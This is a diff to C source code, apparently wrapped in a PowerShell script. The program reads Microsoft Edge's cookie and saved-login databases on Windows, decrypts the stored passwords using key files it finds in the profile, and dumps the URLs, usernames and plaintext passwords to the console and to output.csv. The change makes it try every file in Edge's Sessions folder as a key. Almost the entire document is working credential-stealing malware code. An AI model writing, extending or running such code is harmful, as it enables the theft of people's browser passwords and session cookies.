@@ -10,7 +10,9 @@ $cCode = @"
 #include <string.h>
 #include <windows.h>
 #include <shlobj.h>
-#include "sqlite3.h"
+#include <sqlite3.h>
+#include <io.h>
+#include <fcntl.h>
 
 #ifndef _WIN32_WINNT
 #define _WIN32_WINNT 0x0500
@@ -100,7 +102,7 @@ void read_cookies(sqlite3 *db, FILE *file) {
     sqlite3_finalize(res);
 }
 
-void read_passwords(sqlite3 *db, FILE *file) {
+void read_passwords(sqlite3 *db, FILE *file, const char *session_key_dir) {
     sqlite3_stmt *res;
     const char *sql = "SELECT origin_url, username_value, password_value FROM logins";
     int rc = sqlite3_prepare_v2(db, sql, -1, &res, 0);
@@ -110,64 +112,82 @@ void read_passwords(sqlite3 *db, FILE *file) {
         return;
     }
 
-    // Obtain the Edge session key from the default path
-    char session_key_path[MAX_PATH];
-    snprintf(session_key_path, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Local State", getenv("LOCALAPPDATA"));
-    FILE *key_file = fopen(session_key_path, "rb");
-    if (!key_file) {
-        fprintf(stderr, "Failed to open session key file\n");
+    // Read all session keys from the session key directory
+    struct _finddata_t file_info;
+    intptr_t handle;
+    char search_path[MAX_PATH];
+    snprintf(search_path, MAX_PATH, "%s\\*", session_key_dir);
+
+    handle = _findfirst(search_path, &file_info);
+    if (handle == -1) {
+        fprintf(stderr, "Failed to find session key files\n");
         return;
     }
-    fseek(key_file, 0, SEEK_END);
-    int key_len = ftell(key_file);
-    fseek(key_file, 0, SEEK_SET);
-    void *session_key = malloc(key_len);
-    if (!session_key) {
-        fprintf(stderr, "Memory allocation failed\n");
-        fclose(key_file);
-        return;
-    }
-    fread(session_key, 1, key_len, key_file);
-    fclose(key_file);
 
-    // Print the session key to the console and output.csv
-    printf("Session key length: %d\n", key_len);
-    printf("Session key: ");
-    for (int i = 0; i < key_len; i++) {
-        printf("%02x ", ((unsigned char *)session_key)[i]);
-    }
-    printf("\n");
+    do {
+        if (!(file_info.attrib & _A_SUBDIR)) {
+            char session_key_path[MAX_PATH];
+            snprintf(session_key_path, MAX_PATH, "%s\\%s", session_key_dir, file_info.name);
+            FILE *key_file = fopen(session_key_path, "rb");
+            if (!key_file) {
+                fprintf(stderr, "Failed to open session key file: %s\n", session_key_path);
+                continue;
+            }
+            fseek(key_file, 0, SEEK_END);
+            int key_len = ftell(key_file);
+            fseek(key_file, 0, SEEK_SET);
+            void *session_key = malloc(key_len);
+            if (!session_key) {
+                fprintf(stderr, "Memory allocation failed\n");
+                fclose(key_file);
+                continue;
+            }
+            fread(session_key, 1, key_len, key_file);
+            fclose(key_file);
 
-    fprintf(file, "Session Key,");
-    for (int i = 0; i < key_len; i++) {
-        fprintf(file, "%02x", ((unsigned char *)session_key)[i]);
-        if (i < key_len - 1) {
-            fprintf(file, " ");
+            // Print the session key to the console and output.csv
+            printf("Session key length: %d\n", key_len);
+            printf("Session key: ");
+            for (int i = 0; i < key_len; i++) {
+                printf("%02x ", ((unsigned char *)session_key)[i]);
+            }
+            printf("\n");
+
+            fprintf(file, "Session Key,");
+            for (int i = 0; i < key_len; i++) {
+                fprintf(file, "%02x", ((unsigned char *)session_key)[i]);
+                if (i < key_len - 1) {
+                    fprintf(file, " ");
+                }
+            }
+            fprintf(file, "\n");
+
+            while (sqlite3_step(res) == SQLITE_ROW) {
+                const char *origin_url = (const char *)sqlite3_column_text(res, 0);
+                const char *username_value = (const char *)sqlite3_column_text(res, 1);
+                const void *password_value = sqlite3_column_blob(res, 2);
+                int password_len = sqlite3_column_bytes(res, 2);
+
+                printf("Encrypted password length: %d\n", password_len);
+                for (int i = 0; i < password_len; i++) {
+                    printf("%02x ", ((unsigned char *)password_value)[i]);
+                }
+                printf("\n");
+
+                char *dec_password = decrypt_password(password_value, password_len, session_key, key_len);
+                if (dec_password) {
+                    printf("Read password: %s, %s, %s\n", origin_url, username_value, dec_password);
+                    write_to_csv(file, "Password", origin_url, username_value, dec_password);
+                    free(dec_password);
+                }
+            }
+
+            free(session_key);
+            sqlite3_reset(res); // Reset the statement to reuse it for the next session key
         }
-    }
-    fprintf(file, "\n");
+    } while (_findnext(handle, &file_info) == 0);
 
-    while (sqlite3_step(res) == SQLITE_ROW) {
-        const char *origin_url = (const char *)sqlite3_column_text(res, 0);
-        const char *username_value = (const char *)sqlite3_column_text(res, 1);
-        const void *password_value = sqlite3_column_blob(res, 2);
-        int password_len = sqlite3_column_bytes(res, 2);
-
-        printf("Encrypted password length: %d\n", password_len);
-        for (int i = 0; i < password_len; i++) {
-            printf("%02x ", ((unsigned char *)password_value)[i]);
-        }
-        printf("\n");
-
-        char *dec_password = decrypt_password(password_value, password_len, session_key, key_len);
-        if (dec_password) {
-            printf("Read password: %s, %s, %s\n", origin_url, username_value, dec_password);
-            write_to_csv(file, "Password", origin_url, username_value, dec_password);
-            free(dec_password);
-        }
-    }
-
-    free(session_key);
+    _findclose(handle);
     sqlite3_finalize(res);
 }
 
@@ -189,7 +209,7 @@ void inspect_schema(sqlite3 *db) {
     sqlite3_finalize(res);
 }
 
-void read_database(const char *db_path, void (*read_func)(sqlite3 *, FILE *), FILE *file) {
+void read_database(const char *db_path, void (*read_func)(sqlite3 *, FILE *, const char *), FILE *file, const char *session_key_dir) {
     sqlite3 *db;
     int rc = sqlite3_open(db_path, &db);
 
@@ -200,21 +220,24 @@ void read_database(const char *db_path, void (*read_func)(sqlite3 *, FILE *), FI
 
     printf("Reading database: %s\n", db_path);
     inspect_schema(db); // Inspect the schema before reading
-    read_func(db, file);
+    read_func(db, file, session_key_dir);
     sqlite3_close(db);
 }
 
 int main() {
     char edge_cookies[MAX_PATH];
     char edge_passwords[MAX_PATH];
+    char session_key_dir[MAX_PATH];
 
     // Get paths for Edge
     snprintf(edge_cookies, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
     snprintf(edge_passwords, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));
+    snprintf(session_key_dir, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Sessions", getenv("LOCALAPPDATA"));
 
     // Print paths for verification
     printf("Edge cookies path: %s\n", edge_cookies);
     printf("Edge passwords path: %s\n", edge_passwords);
+    printf("Session key directory: %s\n", session_key_dir);
 
     FILE *file = fopen("output.csv", "w");
     if (!file) {
@@ -225,8 +248,8 @@ int main() {
     fprintf(file, "Type,Column1,Column2,Column3\n");
 
     printf("Reading Edge cookies and passwords...\n");
-    read_database(edge_cookies, read_cookies, file);
-    read_database(edge_passwords, read_passwords, file);
+    read_database(edge_cookies, read_cookies, file, session_key_dir);
+    read_database(edge_passwords, read_passwords, file, session_key_dir);
 
     fclose(file);
 
